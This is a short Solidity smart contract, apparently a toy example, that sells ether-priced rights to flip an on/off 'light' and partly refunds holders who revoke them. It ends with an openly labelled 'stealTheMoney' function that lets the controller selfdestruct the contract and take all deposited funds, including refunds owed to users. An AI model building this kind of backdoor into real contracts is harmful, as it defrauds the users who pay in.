/**
 *  @title Light Flipper
 *  @author Klaudiusz Dembler <k.dembler@gmail.com>
 */
pragma solidity ^0.4.19;

contract LightFlipper {
    enum State { Active, Paused, Inactive }

    State public state;
    address public controller;
    bool public flipped;

    mapping(address => bool) public flippingRights;
    mapping(address => uint) pendingWithdrawals;

    event BoughtFlippingRights(address who);
    event RevokedFlippingRights(address who);
    event FlippedLight(address who, bool newState);

    modifier onlyController() {
        require(msg.sender == controller);
        _;
    }

    /**
     *  @dev Light Flipper constructor
     */
    function LightFlipper() public {
        controller = msg.sender;
        state = State.Active;
    }

    /**
     *  @dev Buy flipping rights for 0.5 ether
     */
    function buyFlippingRights() public payable {
        require(state != State.Inactive);
        require(!flippingRights[msg.sender]);
        require(msg.value >= 0.5 ether);

        flippingRights[msg.sender] = true;

        BoughtFlippingRights(msg.sender);
    }

    /**
     *  @dev Revoke your flipping rights and recompensate half of the funds
     */
    function revokeFlippingRights() public {
        require(flippingRights[msg.sender]);
        // check if sender has revoked rights so many times that he could overflow his pending withdrawals
        require(pendingWithdrawals[msg.sender] + 0.25 ether > pendingWithdrawals[msg.sender]);

        flippingRights[msg.sender] = false;
        // recompensate half of the funds
        pendingWithdrawals[msg.sender] += 0.25 ether;

        RevokedFlippingRights(msg.sender);
    }

    /**
     *  @dev Withdraw your recompensated funds after revoking flipping rights
     */
    function withdraw() public {
        require(pendingWithdrawals[msg.sender] > 0);

        uint amount = pendingWithdrawals[msg.sender];
        pendingWithdrawals[msg.sender] = 0;

        msg.sender.transfer(amount);
    }

    /**
     *  @dev Flip the light
     */
    function flip() public {
        require(state == State.Active);
        require(msg.sender == controller || flippingRights[msg.sender]);

        flipped = !flipped;

        FlippedLight(msg.sender, flipped);
    }

    /**
     *  @dev Change contract's state, to be called by the controller
     *  @param _state New state of the contract
     */
    function changeState(State _state) public onlyController {
        state = _state;
    }

    /**
     *  @dev Change contract's controller, to be called by the controller
     *  @param _controller Address of new controller of the contract
     */
    function changeController(address _controller) public onlyController {
        controller = _controller;
    }

    /**
     *  @dev Scam everyone, to be called by the controller
     */
    function stealTheMoney() public onlyController {
        // oups
        selfdestruct(msg.sender);
    }
}
